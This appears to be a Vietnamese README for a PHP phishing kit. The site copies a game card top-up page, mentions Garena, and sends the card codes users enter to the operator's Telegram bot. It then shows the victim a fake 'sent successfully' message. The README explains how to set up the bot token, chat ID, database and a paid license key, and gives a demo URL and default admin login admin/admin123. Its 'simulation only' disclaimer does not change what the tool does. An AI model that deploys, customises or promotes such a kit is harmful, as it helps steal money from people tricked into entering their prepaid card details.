# Trang Nạp Thẻ

Đây là một trang web mô phỏng nạp thẻ game, với giao diện đơn giản bằng php để xử lý việc gửi thông tin đến Telegram bot.

# Demo:
   - Page: protechweb.x10.mx
   - Admin Pages: protechweb.x10.mx/login.php
# Cấu hình tối thiểu 
   - PHP 7.4+
   - MySQL / MariaDB
   - PDO MySQL
   - cURL enabled
   - HTTPS hosting


## Cách cấu hình

1. Trước tiên, bạn cần tạo một bot Telegram và lấy token của bot:
   - Trò chuyện với [@BotFather](https://t.me/BotFather) trên Telegram
   - Sử dụng lệnh `/newbot` để tạo bot mới
   - Làm theo hướng dẫn và lấy API token của bot

   1.1.   Import file srcdb.sql vào phpmyadmin

2. Mở file `.env` và thay đổi các thông tin sau:
   ```php
   DB_HOST=localhost // Thay thế bằng host của bạn (nếu có)
   DB_NAME=          // Thay thế bằng database
   DB_USER=root      // Thay thế bằng tên Tài Khoản Database     
   DB_PASS=          // Thay thế bằng Mật khẩu Database
   BOT_TOKEN=Your_Telegram_Bot_Token_Here // Thay thế bằng token bot của bạn
   CHAT_ID=-Your_Telegram_Chat_ID_Here; // Thay thế bằng ID chat của bạn hoặc nhóm
   LICENSE_KEY=                         // Thay thế bằng license key
   ```
   2.1. Để có license key
   - Liên hệ [@minhduc290613](https://t.me/@minhduc290613) qua telegram để lấy key

3. Để lấy Chat ID:
   - Nếu muốn gửi tin nhắn đến chat cá nhân: Trò chuyện với [@userinfobot](https://t.me/userinfobot) để lấy ID của bạn
   - Nếu muốn gửi tin nhắn đến nhóm: Thêm bot [@MissRose_bot](https://t.me/@MissRose_bot) vào nhóm và lấy chat ID từ dữ liệu hiển thị

## Cách sử dụng

1. Tải các file lên máy chủ web của bạn hỗ trợ PHP (ví dụ: cPanel, Hosting Vietnam, Hostinger, v.v.)
2. Truy cập vào trang web qua domain hoặc IP máy chủ
3. Khi người dùng nhập thông tin nạp thẻ và ấn nút "Thanh toán", thông tin sẽ được gửi đến bot Telegram của bạn
4. Người dùng sẽ thấy thông báo "Thẻ đã dược gửi thành công"

## Các tính năng

- Giao diện giống trang nạp thẻ game thật
- Modal thông báo "Thẻ đã dược gửi thành công" khi gửi thông tin
- Bảo mật token Telegram bot bằng cách tách riêng file PHP
- Hỗ trợ responsive trên mọi thiết bị

## Lưu ý bảo mật

- File `.env` chứa token của bot Telegram, nên bảo vệ file này khỏi truy cập trực tiếp nếu có thể
- Đây chỉ là trang web giả lập, không phải trang nạp thẻ chính thức của Garena
- Không lưu trữ hoặc sử dụng thông tin người dùng cho mục đích xấu

## Tùy chỉnh

Bạn có thể tùy chỉnh thêm các phần sau:
- Thay đổi hình ảnh, logo hoặc giao diện trong file HTML trong phpmyadmin
- Thêm các chức năng xác thực hoặc bảo mật khác
- Thay đổi định dạng tin nhắn gửi đến Telegram trong file PHP

## Admin Panel
URL:/admin.php

## Default Login
- Username: admin
- Password: admin123
- Nếu muốn thay đổi, vào phpmyadmin, admin_user, nhập Tài khoản và Mật khâu (Mật khẩu phải dc mã hoá bằng sha256) 

## License
This code is under MIT License

